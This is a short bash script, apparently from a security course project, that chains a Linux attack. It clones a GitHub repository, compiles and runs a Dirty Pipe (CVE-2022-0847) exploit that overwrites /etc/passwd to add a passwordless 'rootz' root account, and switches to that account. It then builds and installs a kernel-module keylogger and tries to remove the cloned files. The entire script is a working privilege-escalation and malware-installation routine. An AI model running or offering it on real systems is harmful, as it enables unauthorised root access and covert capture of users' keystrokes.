#!/bin/bash
git clone https://github.com/Sad-0w/CS564_project.git
cd CS564_project/privilege_escalation
gcc cve-2022-0847.c -o cve-2022-0847
./cve-2022-0847 /etc/passwd 1 ootz:
su rootz
cd ..
cd lkm_keylogger
make
sudo make install
cd ..
cd ..
rmdir -rf CS564_project
